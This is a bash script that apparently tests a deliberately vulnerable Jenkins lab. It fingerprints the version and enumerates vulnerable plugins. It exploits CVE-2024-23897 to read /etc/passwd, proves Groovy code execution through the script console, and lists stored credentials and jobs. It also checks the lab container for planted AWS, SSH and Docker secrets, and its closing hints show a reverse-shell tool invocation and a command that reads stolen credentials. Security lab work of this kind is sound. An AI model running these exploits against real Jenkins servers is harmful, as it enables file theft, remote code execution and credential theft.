#!/bin/bash

set -e

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

# Configuration - can be overridden with environment variables
JENKINS_URL="${JENKINS_URL:-http://localhost:8080}"
JENKINS_USER="${JENKINS_USER:-admin}"
JENKINS_PASS="${JENKINS_PASS:-admin}"
TEST_RESULTS=()

echo "[*] Jenkins Lab Exploit Testing Script"
echo "[*] Comprehensive CVE validation for Jenkins Lab"
echo ""

# Warn if using default credentials
if [ "$JENKINS_USER" = "admin" ] && [ "$JENKINS_PASS" = "admin" ]; then
    echo "[!] WARNING: Using default credentials (admin/admin)"
    echo "[!] Set JENKINS_USER and JENKINS_PASS environment variables for custom credentials"
    echo ""
fi

if ! curl -s "$JENKINS_URL" > /dev/null 2>&1; then
    echo "[!] Jenkins is not running. Please start the lab first."
    echo "[*] Run: ./scripts/setup.sh"
    exit 1
fi

echo "[+] Jenkins is running at $JENKINS_URL"
echo ""

echo "=== [1/7] Version Fingerprinting ==="
VERSION=$(curl -s -I "$JENKINS_URL" | grep -i "X-Jenkins:" | awk '{print $2}' | tr -d '\r' || echo "Unknown")
echo "[*] Jenkins version: $VERSION"

FULL_VERSION=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/api/json" | python3 -c "import sys, json; print(json.load(sys.stdin).get('version', 'Unknown'))" 2>/dev/null || echo "Unknown")
echo "[*] Full version: $FULL_VERSION"

if [[ "$FULL_VERSION" =~ 2.138 ]]; then
    echo "[+] Version is vulnerable to CVE-2018-1000861 (Stapler RCE)"
    TEST_RESULTS+=("CVE-2018-1000861: VULNERABLE")
else
    TEST_RESULTS+=("CVE-2018-1000861: Unknown")
fi

echo ""
echo "=== [2/7] Plugin Enumeration ==="
echo "[*] Enumerating installed plugins..."
PLUGINS=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/pluginManager/api/json?depth=1" 2>/dev/null)

if [ -n "$PLUGINS" ]; then
    echo "$PLUGINS" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    plugins = data.get('plugins', [])
    
    vulnerable = {
        'script-security': ('1.53', 'CVE-2019-1003029/30'),
        'git-server': ('1.7', 'CVE-2020-2100'),
        'credentials': ('2.1.18', 'CVE-2019-10358'),
        'workflow-cps': ('2.63', 'CVE-2021-21686'),
        'aws-codedeploy': ('1.19', 'CVE-2018-1000402'),
    }
    
    print(f'[+] Total plugins installed: {len(plugins)}')
    print('[*] Vulnerable plugins detected:')
    
    for p in plugins:
        name = p.get('shortName', '')
        version = p.get('version', '')
        if name in vulnerable:
            vuln_version, cve = vulnerable[name]
            print(f'  - {name}:{version} (Expected {vuln_version} for {cve})')
except:
    print('[!] Failed to parse plugin data')
" 2>/dev/null
    TEST_RESULTS+=("Plugin enumeration: SUCCESS")
else
    echo "[!] Failed to enumerate plugins"
    TEST_RESULTS+=("Plugin enumeration: FAILED")
fi

echo ""
echo "=== [3/7] CVE-2024-23897 (CLI Arbitrary File Read) ==="
echo "[*] Downloading Jenkins CLI jar..."

CLI_JAR="/tmp/jenkins-cli.jar"
curl -s "$JENKINS_URL/jnlpJars/jenkins-cli.jar" -o "$CLI_JAR"

if [ -f "$CLI_JAR" ]; then
    echo "[+] CLI jar downloaded"
    
    if command -v java &> /dev/null; then
        echo "[*] Testing file read via CLI help command..."
        echo "[*] Attempting to read /etc/passwd..."
        
        OUTPUT=$(java -jar "$CLI_JAR" -s "$JENKINS_URL" help "@/etc/passwd" 2>&1 | head -n 15)
        
        if echo "$OUTPUT" | grep -q "root:" || echo "$OUTPUT" | grep -q "/bin/bash"; then
            echo "[+] CVE-2024-23897 is EXPLOITABLE - File read successful!"
            echo "[*] First few lines of /etc/passwd:"
            echo "$OUTPUT" | grep -E "^[a-z].*:" | head -n 3
            TEST_RESULTS+=("CVE-2024-23897: EXPLOITABLE")
        else
            echo "[!] File read attempt failed or patched"
            TEST_RESULTS+=("CVE-2024-23897: Not exploitable")
        fi
    else
        echo "[!] Java not found - cannot test CLI exploits"
        echo "[*] Install Java to test CVE-2024-23897"
        TEST_RESULTS+=("CVE-2024-23897: Skipped (no Java)")
    fi
else
    echo "[!] Failed to download CLI jar"
    TEST_RESULTS+=("CVE-2024-23897: Failed")
fi

echo ""
echo "=== [4/7] CVE-2019-1003029/30 (Script Security Groovy RCE) ==="
SCRIPT_URL="$JENKINS_URL/script"
SCRIPT_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -u "$JENKINS_USER:$JENKINS_PASS" "$SCRIPT_URL")

if [ "$SCRIPT_RESPONSE" = "200" ]; then
    echo "[+] Script console is accessible at $SCRIPT_URL"
    echo "[*] Testing basic Groovy execution..."
    
    CRUMB=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/crumbIssuer/api/json" | python3 -c "import sys, json; print(json.load(sys.stdin)['crumb'])" 2>/dev/null || echo "")
    
    if [ -n "$CRUMB" ]; then
        CRUMB_HEADER="Jenkins-Crumb: $CRUMB"
    else
        CRUMB_HEADER=""
    fi
    
    GROOVY_TEST='println("RCE_TEST_SUCCESS")'
    RESULT=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" -X POST "$SCRIPT_URL" \
        -H "$CRUMB_HEADER" \
        --data-urlencode "script=$GROOVY_TEST" 2>/dev/null || echo "")
    
    if echo "$RESULT" | grep -q "RCE_TEST_SUCCESS"; then
        echo "[+] Groovy script execution SUCCESSFUL - RCE possible"
        TEST_RESULTS+=("CVE-2019-1003029: EXPLOITABLE")
    else
        echo "[!] Groovy execution failed or restricted"
        TEST_RESULTS+=("CVE-2019-1003029: Unknown")
    fi
else
    echo "[!] Script console returned HTTP $SCRIPT_RESPONSE"
    TEST_RESULTS+=("CVE-2019-1003029: Not accessible")
fi

echo ""
echo "=== [5/7] Credentials Enumeration ==="
CREDS_URL="$JENKINS_URL/credentials/"
CREDS_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -u "$JENKINS_USER:$JENKINS_PASS" "$CREDS_URL")

if [ "$CREDS_RESPONSE" = "200" ]; then
    echo "[+] Credentials page is accessible"
    echo "[*] Attempting to list credentials via API..."
    
    CREDS_DATA=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/credentials/store/system/domain/_/api/json" 2>/dev/null)
    
    if [ -n "$CREDS_DATA" ]; then
        CREDS_COUNT=$(echo "$CREDS_DATA" | python3 -c "import sys, json; print(len(json.load(sys.stdin).get('credentials', [])))" 2>/dev/null || echo "0")
        echo "[+] Found $CREDS_COUNT credentials in system store"
        
        if [ "$CREDS_COUNT" -gt "0" ]; then
            echo "[*] Credential IDs:"
            echo "$CREDS_DATA" | python3 -c "
import sys, json
try:
    creds = json.load(sys.stdin).get('credentials', [])
    for c in creds[:10]:
        cred_id = c.get('id', 'unknown')
        cred_desc = c.get('description', 'No description')
        print(f'  - {cred_id}: {cred_desc}')
except:
    pass
" 2>/dev/null
            TEST_RESULTS+=("Credentials enumeration: SUCCESS ($CREDS_COUNT found)")
        fi
    fi
else
    echo "[!] Credentials page returned HTTP $CREDS_RESPONSE"
    TEST_RESULTS+=("Credentials enumeration: FAILED")
fi

echo ""
echo "=== [6/7] Job Enumeration ==="
JOBS_DATA=$(curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$JENKINS_URL/api/json?tree=jobs[name,url]" 2>/dev/null)

if [ -n "$JOBS_DATA" ]; then
    JOBS_COUNT=$(echo "$JOBS_DATA" | python3 -c "import sys, json; print(len(json.load(sys.stdin).get('jobs', [])))" 2>/dev/null || echo "0")
    echo "[+] Found $JOBS_COUNT jobs"
    
    if [ "$JOBS_COUNT" -gt "0" ]; then
        echo "[*] Job names:"
        echo "$JOBS_DATA" | python3 -c "
import sys, json
try:
    jobs = json.load(sys.stdin).get('jobs', [])
    for j in jobs:
        print(f\"  - {j.get('name', 'Unknown')}\")
except:
    pass
" 2>/dev/null
        TEST_RESULTS+=("Job enumeration: SUCCESS ($JOBS_COUNT jobs)")
    fi
else
    echo "[!] Failed to enumerate jobs"
    TEST_RESULTS+=("Job enumeration: FAILED")
fi

echo ""
echo "=== [7/7] Secrets Verification ==="
echo "[*] Checking for planted secrets in container..."

CONTAINER_NAME=$(docker ps --filter "name=jenkins" --format "{{.Names}}" 2>/dev/null | head -n 1)

if [ -n "$CONTAINER_NAME" ]; then
    echo "[+] Jenkins container: $CONTAINER_NAME"
    echo "[*] Testing secret files:"
    
    SECRETS_FOUND=0
    
    for secret_path in \
        "/home/jenkins/.aws/credentials" \
        "/home/jenkins/.ssh/id_rsa" \
        "/home/jenkins/.npmrc" \
        "/home/jenkins/.docker/config.json" \
        "/home/jenkins/.m2/settings.xml"; do
        
        if docker exec "$CONTAINER_NAME" test -f "$secret_path" 2>/dev/null; then
            echo "  [+] $secret_path exists"
            SECRETS_FOUND=$((SECRETS_FOUND + 1))
        else
            echo "  [!] $secret_path not found"
        fi
    done
    
    if [ $SECRETS_FOUND -gt 0 ]; then
        TEST_RESULTS+=("Secrets verification: SUCCESS ($SECRETS_FOUND/5 found)")
    else
        TEST_RESULTS+=("Secrets verification: FAILED")
    fi
else
    echo "[!] Jenkins container not found"
    TEST_RESULTS+=("Secrets verification: Skipped")
fi

echo ""
echo "============================================"
echo "           TEST RESULTS SUMMARY            "
echo "============================================"

for result in "${TEST_RESULTS[@]}"; do
    if echo "$result" | grep -qi "exploitable\|success"; then
        echo "[+] $result"
    elif echo "$result" | grep -qi "failed\|not accessible"; then
        echo "[!] $result"
    else
        echo "[*] $result"
    fi
done

echo ""
echo "============================================"
echo ""
echo "[*] Next steps:"
echo "    1. Run full JenkinsBreaker suite:"
echo "       cd .. && python3 JenkinsBreaker.py --url $JENKINS_URL --auto --lhost 127.0.0.1 --lport 9001"
echo ""
echo "    2. Manual testing with credentials:"
echo "       Username: admin"
echo "       Password: admin"
echo ""
echo "    3. Extract secrets from container:"
echo "       docker exec $CONTAINER_NAME cat /home/jenkins/.aws/credentials"
echo ""
echo "    4. View Jenkins logs:"
echo "       docker logs $CONTAINER_NAME"
echo ""
echo "[+] Testing complete!"
